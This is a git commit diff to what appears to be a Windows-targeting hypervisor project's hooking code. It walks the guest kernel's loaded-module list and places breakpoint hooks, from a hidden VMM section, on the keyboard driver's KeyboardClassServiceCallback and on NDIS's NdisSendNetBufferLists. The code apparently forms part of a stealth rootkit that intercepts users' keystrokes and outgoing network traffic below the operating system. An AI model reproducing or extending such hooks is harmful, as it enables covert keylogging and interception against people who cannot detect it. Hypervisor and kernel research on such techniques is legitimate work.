7d42db644e333bad2181bdf6d3f4f676be4ea110
gognl <gonigolan@gmail.com>
2024-03-25 20:45:31 +0200

    Added optimization for finding drivers

--- src/hooks/hooking.c
+++ src/hooks/hooking.c
@@ -2,7 +2,6 @@
 #include <lib/instr.h>
 #include <lib/util.h>
 
-
 __attribute__((section(".vmm"))) uint64_t guest_virtual_to_physical(uint64_t addr){
     qword_t *pml4 = __vmread(GUEST_CR3), *pml3, *pml2, *pml1;
     qword_t pml4e, pml3e, pml2e, pml1e;
@@ -27,10 +26,29 @@ __attribute__((section(".vmm"))) uint64_t guest_virtual_to_physical(uint64_t add
 
 }
 
+__attribute__((section(".vmm"))) uint64_t get_node_dllbase(qword_t node){
+    return *(uint64_t*)guest_virtual_to_physical(KLDR_DATA_TABLE_ENTRY_DllBase(node));
+}
+
+__attribute__((section(".vmm"))) uint16_t get_node_dllname_length(qword_t node){
+    return *(uint16_t*)guest_virtual_to_physical(UNICODE_STRING_Length(KLDR_DATA_TABLE_ENTRY_BaseDllName(node)));
+}
+
+__attribute__((section(".vmm"))) qword_t get_node_dllname_buffer(qword_t node){
+    return guest_virtual_to_physical(*(qword_t*)guest_virtual_to_physical(UNICODE_STRING_Buffer(KLDR_DATA_TABLE_ENTRY_BaseDllName(node))));
+}
+
+__attribute__((section(".vmm"))) qword_t get_next_node(qword_t node){
+    return *(uint64_t*)guest_virtual_to_physical(KLDR_DATA_TABLE_ENTRY_Flink(node));
+}
+
+__attribute__((section(".vmm"))) qword_t get_previous_node(qword_t node){
+    return *(uint64_t*)guest_virtual_to_physical(KLDR_DATA_TABLE_ENTRY_Blink(node));
+}
+
 __attribute__((section(".vmm"))) void hook_function(byte_t *func){
     *func = INT3_OPCODE;
 }
-
 
 __attribute__((section(".vmm"))) void handle_lstar_write(uint64_t lstar){
 
@@ -51,6 +69,7 @@ __attribute__((section(".vmm"))) void handle_lstar_write(uint64_t lstar){
     clear_msr_bitmap_write(LSTAR_MSR, shared_cores_data.msr_bitmaps);
 
     hook_function(MiDriverLoadSucceeded_phys);
+
 }
 
 __attribute__((section(".vmm"))) void handle_MiDriverLoadSucceeded_hook(vmexit_data_t *state){
@@ -61,22 +80,22 @@ __attribute__((section(".vmm"))) void handle_MiDriverLoadSucceeded_hook(vmexit_d
     uint64_t guest_stack_phys = guest_virtual_to_physical(guest_stack);
     *(uint64_t*)guest_stack_phys = state->registers->rbp;
 
-    uint64_t driver = *(uint64_t*)(guest_virtual_to_physical(guest_stack+0x70));
-
-    // Try kbdclass
-    uint64_t kbdclass_signature_phys = guest_virtual_to_physical(driver+KBDCLASS_SIGNATURE_OFFSET);
-    if (memcmp(kbdclass_signature_phys, "kbdclass.pdb", 13)){
-        LOG_INFO("Found kbdclass.sys: %x\n", driver);
-        
-        shared_cores_data.kbdclass = driver;
-        hook_function(guest_virtual_to_physical(shared_cores_data.kbdclass + KBDCLASS_KeyboardClassServiceCallback_OFFSET));
-
-    }
-
+    // Find ndis
     if (shared_cores_data.ndis == 0){
         shared_cores_data.ndis = find_windows_module(u"ndis.sys", 16);
-        if (shared_cores_data.ndis != 0)
+        if (shared_cores_data.ndis != 0){
+            hook_function(guest_virtual_to_physical(shared_cores_data.ndis + NDIS_NdisSendNetBufferLists_OFFSET));
             LOG_INFO("Found ndis.sys: %x\n", shared_cores_data.ndis);
+        }
+    }
+
+    // Find kbdclass
+    uint64_t PsLoadedModuleList = shared_cores_data.ntoskrnl+NTOSKRNL_PsLoadedModuleList_OFFSET;
+    uint64_t head = get_previous_node(PsLoadedModuleList);
+    if (get_node_dllname_length(head) == sizeof(u"kbdclass.sys")-2 && memcmp(get_node_dllname_buffer(head), u"kbdclass.sys", sizeof(u"kbdclass.sys")-2)){
+        shared_cores_data.kbdclass = get_node_dllbase(head);
+        hook_function(guest_virtual_to_physical(shared_cores_data.kbdclass + KBDCLASS_KeyboardClassServiceCallback_OFFSET));
+        LOG_INFO("Found kbdclass.sys: %x\n", shared_cores_data.kbdclass);
     }
 
     // Remove the MiDriverLoadSucceeded hook if all drivers were found
@@ -88,25 +107,7 @@ __attribute__((section(".vmm"))) void handle_MiDriverLoadSucceeded_hook(vmexit_d
 
 }
 
-__attribute__((section(".vmm"))) uint64_t get_node_dllbase(qword_t node){
-    return *(uint64_t*)guest_virtual_to_physical(KLDR_DATA_TABLE_ENTRY_DllBase(node));
-}
-
-__attribute__((section(".vmm"))) uint16_t get_node_dllname_length(qword_t node){
-    return *(uint16_t*)guest_virtual_to_physical(UNICODE_STRING_Length(KLDR_DATA_TABLE_ENTRY_BaseDllName(node)));
-}
-
-__attribute__((section(".vmm"))) qword_t get_node_dllname_buffer(qword_t node){
-    return guest_virtual_to_physical(*(qword_t*)guest_virtual_to_physical(UNICODE_STRING_Buffer(KLDR_DATA_TABLE_ENTRY_BaseDllName(node))));
-}
-
-__attribute__((section(".vmm"))) qword_t get_next_node(qword_t node){
-    return *(uint64_t*)guest_virtual_to_physical(KLDR_DATA_TABLE_ENTRY_Flink(node));
-}
-
 __attribute__((section(".vmm"))) qword_t find_windows_module(wchar_t *name, uint16_t len){
-
-    uint64_t guest_cr3 = __vmread(GUEST_CR3);
 
     qword_t node = shared_cores_data.ntoskrnl+NTOSKRNL_PsLoadedModuleList_OFFSET;
 
